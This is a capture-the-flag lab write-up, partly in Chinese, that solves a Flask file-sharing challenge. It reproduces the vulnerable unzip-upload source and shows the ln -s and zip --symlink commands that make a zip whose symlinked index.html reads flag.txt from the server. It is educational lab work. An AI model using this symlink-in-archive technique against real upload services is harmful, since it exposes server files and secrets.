---
title: 'Share ShaRCE'
disqus: hackmd
---

Share ShaRCE
===


## Table of Contents

[TOC]

## Topic

Share ShaRCE
Entroy大哥提供
https://hackmd.io/@entroy/B1XDG0rBa

> docker compose up

![image](https://hackmd.io/_uploads/By3khhSHT.png)

●LAB: http://chw.com:8080/ \
![image](https://hackmd.io/_uploads/HyJS3MGSa.png)

| ![image](https://hackmd.io/_uploads/S1CbZXzBT.png) | ![image](https://hackmd.io/_uploads/BywXb7frT.png) |
|:--------------------------------------------------:|:--------------------------------------------------:|
|                     login.html                     |                     index.html                     |

## Solution

### 1. Attempt
●未選擇任何檔案\
![image](https://hackmd.io/_uploads/H1LdzXGB6.png)\
●上傳 test.txt\
![image](https://hackmd.io/_uploads/rkPjMXzrT.png)\
●上傳 test.zip (壓縮test.txt)\
![image](https://hackmd.io/_uploads/ryVDrmMH6.png)\
●上傳 index.zip (一定要包含index.html)\
![image](https://hackmd.io/_uploads/B1zrXXMr6.png)

app.py
```python=
from flask import Flask, g, request, redirect, render_template, session
from sqlite3 import connect
from subprocess import run
from os import path, urandom, mkdir

_DATABASE = '/app/database.db' #SQLite DB
app = Flask(__name__)
app.config['SECRET_KEY'] = urandom(32) #亂數密鑰
app.config['TEMPLATES_AUTO_RELOAD'] = True

def get_db(): #DB連線
  db = getattr(g, '_database', None)
  if db is None:
    db = g._database = connect(_DATABASE)
  return db

with app.app_context(): #SQL紀錄包含: id、username、password和count
  db = get_db()  #明文儲存
  db.cursor().execute("""
    CREATE TABLE IF NOT EXISTS users(
      id Integer PRIMARY KEY,
      username String NOT NULL UNIQUE,
      password String,
      count Integer DEFAULT 0
    );
  """)
  db.commit()

@app.teardown_appcontext
def close_connection(exception):
  db = getattr(g, '_database', None)
  if db is not None:
    db.close()

def safeJoin(_dir, _sub):
  filepath = path.join(_dir, _sub) #將多個路徑組合成一個完整的路徑
  realpath = path.realpath(filepath)
  if not _dir in path.commonpath((_dir, realpath)):
    return None
  return realpath

@app.route('/', methods=['GET'])
def index():
  if 'user' in session:
    return render_template('index.html', name=session['user'])
  return render_template('login.html')
  
@app.route('/login', methods=['POST'])
def login():
  username = request.form.get('username', '')
  password = request.form.get('password', '')
  if not get_db().execute("SELECT * FROM users WHERE username=? and password=?", [username, password]).fetchone():
    return 'Wrong username or password'
  session['user'] = username
  return redirect("/", code=302)

@app.route('/register', methods=['POST'])
def register():
  username = request.form.get('username', '')
  password = request.form.get('password', '')
  db = get_db()
  if db.execute("SELECT * FROM users WHERE username=? LIMIT 1", [username]).fetchone():
    return 'User already exist'
  db.execute("INSERT INTO users (username, password) VALUES (?, ?)", [username, password])
  db.commit()
  session['user'] = username
  return redirect("/", code=302)

@app.route('/upload', methods=['POST'])
def upload_file(): #/upload先驗證user session
  if 'user' not in session:
    return 'Login first'
  if 'file' not in request.files or not request.files['file'].filename:
    return 'Missing file'

  _sub = session['user']
  file = request.files['file']
  tmppath = path.join('/tmp', urandom(16).hex())
  realpath = safeJoin('/app/static', _sub)
  if not realpath:
    return 'No path traversal'
  if not path.exists(realpath):
    mkdir(realpath)

  file.save(tmppath)
  returncode = run(['unzip', '-qo', tmppath, '-d', realpath]).returncode
  if returncode != 0:
    return 'Not a zip file'
  if not path.isfile(path.join(realpath, 'index.html')):
    return '"index.html" not found'
  return redirect(realpath[4:]+'/index.html', code=302)
  
if __name__ == "__main__":
  app.run(host="0.0.0.0")

```
●[path.join](https://docs.python.org/3/library/os.path.html): 將多個路徑組合成一個完整的路徑 (避免Path traversal)

● ../app/database.db\
![image](https://hackmd.io/_uploads/Bk-Es24rp.png)

### 2. Burp-Suite Attempt
http://chw.com:8080 \
![image](https://hackmd.io/_uploads/Hy36AnNST.png)
#### 2.1 admin/admin (NOT Register)
![image](https://hackmd.io/_uploads/HJBbk6ES6.png)
#### 2.2 (1) admin/admin Register
![image](https://hackmd.io/_uploads/B1NBGpVHa.png)
#### 2.2 (2) create session
![image](https://hackmd.io/_uploads/H1aoGaNB6.png)
#### 2.3 Upload index.zip
![image](https://hackmd.io/_uploads/S11DQpNHa.png)

### 3. [Symbolic link](https://en.wikipedia.org/wiki/Symbolic_link)
●[Symbolic link: Command "ln"](https://www.ionos.com/digitalguide/server/configuration/linux-ln-command/): ln為操作指定的來源檔案建立新的hard link。**-s** make symbolic links instead of hard links
```Command=
─$ ln --help
Usage: ln [OPTION]... [-T] TARGET LINK_NAME
  or:  ln [OPTION]... TARGET
  or:  ln [OPTION]... TARGET... DIRECTORY
  or:  ln [OPTION]... -t DIRECTORY TARGET...
In the 1st form, create a link to TARGET with the name LINK_NAME.
In the 2nd form, create a link to TARGET in the current directory.
In the 3rd and 4th forms, create links to each TARGET in DIRECTORY.
Create hard links by default, symbolic links with --symbolic.
By default, each destination (name of new link) should not already exist.
When creating hard links, each TARGET must exist.  Symbolic links
can hold arbitrary text; if later resolved, a relative link is
interpreted in relation to its parent directory.

Mandatory arguments to long options are mandatory for short options too.
      --backup[=CONTROL]      make a backup of each existing destination file
  -b                          like --backup but does not accept an argument
  -d, -F, --directory         allow the superuser to attempt to hard link
                                directories (note: will probably fail due to
                                system restrictions, even for the superuser)
  -f, --force                 remove existing destination files
  -i, --interactive           prompt whether to remove destinations
  -L, --logical               dereference TARGETs that are symbolic links
  -n, --no-dereference        treat LINK_NAME as a normal file if
                                it is a symbolic link to a directory
  -P, --physical              make hard links directly to symbolic links
  -r, --relative              with -s, create links relative to link location
  -s, --symbolic              make symbolic links instead of hard links
  -S, --suffix=SUFFIX         override the usual backup suffix
  -t, --target-directory=DIRECTORY  specify the DIRECTORY in which to create
                                the links
  -T, --no-target-directory   treat LINK_NAME as a normal file always
  -v, --verbose               print name of each linked file
      --help        display this help and exit
      --version     output version information and exit

The backup suffix is '~', unless set with --suffix or SIMPLE_BACKUP_SUFFIX.
The version control method may be selected via the --backup option or through
the VERSION_CONTROL environment variable.  Here are the values:

  none, off       never make backups (even if --backup is given)
  numbered, t     make numbered backups
  existing, nil   numbered if numbered backups exist, simple otherwise
  simple, never   always make simple backups
```
> ln -s flag.txt index.html

(index.html: 建立flag.txt的Symbolic link)
產出後的HTML 是一個symbolic link(不是 file)，無法壓縮zip
> zip upload.zip index.html image.jfif

![image](https://hackmd.io/_uploads/B1KsGprHT.png)

( Upload upload.zip )
![image](https://hackmd.io/_uploads/HyMBA64Sa.png)

**----- 失敗 -----** (更改flag.txt路徑)
> ln -s ../../../../flag.txt index.html
> zip upload.zip index.html image.jfif

![image](https://hackmd.io/_uploads/SkaorpBS6.png)
> **zip warning: name not matched: index.html**
  adding: image.jfif (deflated 2%)
  
**----- 失敗 -----**

● [zip symbolic link](https://serverfault.com/questions/265675/how-can-i-zip-compress-a-symlink): The ZIP format supports storing the symbolic link. To store symbolic links as such, you can use the **--symlinks** option
> zip --symlink index.zip index.html image.jfif

![image](https://hackmd.io/_uploads/Skq4GTBBa.png)
> adding: index.html (stored 0%)
  adding: image.jfif (deflated 2%)
  有壓縮到index.html
  
( Upload index.zip )\
![image](https://hackmd.io/_uploads/HkNyzTBHp.png)

### 4. Get Flag
> **FLAG{dummyflag}**

● WinRAR GUI也有symbolic link壓縮功能\
![image](https://hackmd.io/_uploads/H19oDTrrT.png)

###### tags: `CTF` `Web` `Symbolic Link` 
